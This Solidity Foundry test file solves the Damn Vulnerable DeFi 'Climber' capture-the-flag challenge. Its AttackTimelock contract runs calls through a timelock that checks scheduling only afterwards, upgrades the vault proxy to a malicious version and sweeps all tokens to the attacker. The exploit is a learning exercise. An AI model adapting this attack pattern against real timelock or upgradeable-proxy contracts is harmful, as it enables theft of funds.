// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVault.sol";

contract AttackTimelock {

    address public attacker;
    address public proxy;

    ClimberTimelock timelock;
    ClimberVault  vault;
    ClimberVaultV2 vaultV2;

    constructor(address _attacker, address _proxy, address _timelock, address _vault, address _vaultV2) {
        attacker = _attacker;
        proxy = _proxy;
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        vaultV2 = ClimberVaultV2(_vaultV2);
    }

    function exploit() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory data ) = getData();
        timelock.schedule(targets, values, data, "SALT");
    }

    function getData() public view returns(address[] memory targets, uint256[] memory values, bytes[] memory data) {
        targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = proxy;
        targets[3] = proxy;
        targets[4] = address(this);
        values = new uint256[](5);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;
        data = new bytes[](5);
        data[0] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this));
        data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        data[2] = abi.encodeWithSignature("upgradeTo(address)", address(vaultV2));
        data[3] = abi.encodeWithSignature("setSweeper(address)", address(attacker));
        data[4] = abi.encodeWithSignature("exploit()");
    }

}


contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Note: The key bug is in ClimberTimelock where the check to see if a operation is scheduled
        // happens at the end of the function therefore you can make calls in execute to make the calls
        // prior to the check and to make the final check pass just schedule all the calls you made in execute

        AttackTimelock exploitAddress = new AttackTimelock(
                                                            attacker,
                                                            address(climberVaultProxy),
                                                            address(climberTimelock),
                                                            address(climberImplementation),
                                                            address(new ClimberVaultV2())
                                            );

        (address[] memory targets, uint256[] memory values, bytes[] memory data ) = exploitAddress.getData();

        climberTimelock.execute(targets, values, data, "SALT");

        vm.prank(attacker);
        ClimberVaultV2(address(climberVaultProxy)).sweepFunds(address(dvt));

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
